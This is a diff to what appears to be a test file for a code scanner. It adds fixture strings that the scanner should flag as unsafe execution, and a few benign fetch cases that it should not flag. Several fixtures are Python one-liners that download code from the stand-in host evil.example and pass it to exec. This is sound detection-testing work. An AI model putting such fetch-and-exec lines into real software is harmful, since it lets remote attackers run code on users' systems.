@@ -289,6 +289,23 @@ test("code fetched from the network and executed in-process is unsafe execution"
       "setup.py",
       "import httpx\neval(httpx.post('https://evil.example/x.py', data=payload).text)\n",
     ],
+    // A client built inline is httpx's documented primary shape.
+    [
+      "tools/run.py",
+      "import httpx\nexec(httpx.Client().get('https://evil.example/x.py').text)\n",
+    ],
+    [
+      "tools/run.py",
+      "import httpx\nexec(httpx.Client(base_url='https://evil.example').get('/x.py').text)\n",
+    ],
+    [
+      "tools/run.py",
+      "import httpx\nexec(httpx.AsyncClient().get('https://evil.example/x.py').text)\n",
+    ],
+    [
+      "tools/run.py",
+      "import requests\nexec(requests.Session().get('https://evil.example/x.py').text)\n",
+    ],
     [
       "tools/run.py",
       "import urllib.request\nexec(urllib.request.urlopen('https://evil.example/x.py').read())\n",
@@ -336,6 +353,14 @@ test("fetching data without executing it keeps no unsafe-execution finding", () 
     [
       "tools/run.py",
       "exec(httpx.get('https://example.com/data').status_code)\n",
+    ],
+    [
+      "tools/run.py",
+      "import httpx\nprint(httpx.Client().get('https://example.com/data.json').json())\n",
+    ],
+    [
+      "tools/run.py",
+      "exec(requests.Session().get('https://example.com/data').status_code)\n",
     ],
     // Executing a local file's text is a different act; no fetch appears
     // in the expression.
